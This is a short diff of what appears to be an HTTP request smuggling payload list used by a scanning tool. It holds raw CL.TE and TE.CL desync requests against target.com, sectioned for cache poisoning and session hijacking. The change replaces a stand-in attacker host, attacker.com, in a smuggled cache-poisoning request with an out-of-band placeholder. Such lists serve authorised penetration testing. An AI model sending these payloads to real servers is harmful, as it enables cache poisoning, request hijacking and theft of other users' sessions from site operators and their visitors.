@@ -50,7 +50,7 @@ POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Len
 POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX
 
 # ── CACHE POISONING VIA SMUGGLING ──
-POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 56\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /static/poisoned.css HTTP/1.1\r\nHost: attacker.com\r\nX-Foo: x
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 56\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /static/poisoned.css HTTP/1.1\r\nHost: {{OOB}}\r\nX-Foo: x
 POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 45\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /?cb=123 HTTP/1.1\r\nHost: target.com\r\n
 
 # ── SESSION HIJACKING VIA SMUGGLING ──
